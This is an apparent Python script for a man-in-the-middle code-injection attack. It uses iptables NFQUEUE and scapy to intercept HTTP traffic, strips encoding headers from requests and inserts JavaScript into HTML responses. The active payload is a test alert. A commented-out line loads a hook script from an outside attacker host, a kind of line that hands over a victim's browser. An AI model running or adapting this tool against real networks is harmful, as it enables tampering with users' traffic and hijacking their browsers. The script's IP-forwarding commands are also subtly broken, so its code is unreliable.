import re
import argparse
import subprocess
import scapy.all as scapy
import netfilterqueue


class Command():

    def __init__(self):

        self.options = self.get_arguments()
        if self.options.target == 'local':
            # local
            subprocess.call(['iptables', '-I', 'OUTPUT', '-j',
                             'NFQUEUE', '--queue-num', '0'])
            subprocess.call(['iptables', '-I', 'INPUT', '-j',
                             'NFQUEUE', '--queue-num', '0'])
        elif self.options.target == 'remote':
            # remote
            subprocess.call(
                ['echo', '1', '>', '/proc/sys/net/ipv4/ip_forward'])
            subprocess.call(['iptables', '-I', 'FORWARD', '-j',
                             'NFQUEUE', '--queue-num', '0'])

    def close(self):
        if self.options.target == 'remote':
            subprocess.call(
                ['echo', '0', '>', '/proc/sys/net/ipv4/ip_forward'])

        subprocess.call(['iptables', '--flush'])

    def get_arguments(self):
        parser = argparse.ArgumentParser()
        parser.add_argument('-t', '--target', dest='target',
                            help='target machine -- specify "local" or "remote"')

        options = parser.parse_args()
        if not options.target:
            parser.error(
                '[-] Please specify a target machine, use --help for more info.')

        return options


def set_load(packet, load):
    packet[scapy.Raw].load = load

    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum

    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):

        # load = str(scapy_packet[scapy.Raw].load)
        load = scapy_packet[scapy.Raw].load.decode('utf-8', errors='ignore')

        if scapy_packet[scapy.TCP].dport == 80:
            print('[+] Request')

            load = re.sub(
                r'Accept-Encoding:.*?\r\n', '', load)

        elif scapy_packet[scapy.TCP].sport == 80:
            print('[+] Response')
            # print(scapy_packet.show())
            # bodyタグの場合動作しない
            # '</body>', '<script>alert("test");</script></body>')
            # injection_code = '<script src="http://10.0.2.14:3000/hook.js"></script>'

            injection_code = '<script>alert("test");</script>'
            load = load.replace(
                '</body>', f'{injection_code}</body>')
            # '</head>', f'{injection_code}</head>')

            content_length_search = re.search(
                r'(?:Content-Length:\s)(\d*)', load)
            if content_length_search and 'text/html' in load:
                content_length = content_length_search.group(1)
                new_content_length = int(
                    content_length) + len(injection_code)

                load = load.replace(content_length, str(new_content_length))
                print(load)

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(bytes(new_packet))
            # print(packet[scapy.Raw].load)

    packet.accept()


if __name__ == '__main__':
    cmd = Command()
    try:
        queue = netfilterqueue.NetfilterQueue()
        print(queue)
        queue.bind(0, process_packet)
        queue.run()

    except KeyboardInterrupt:
        print('\riptables --flush')
        cmd.close()
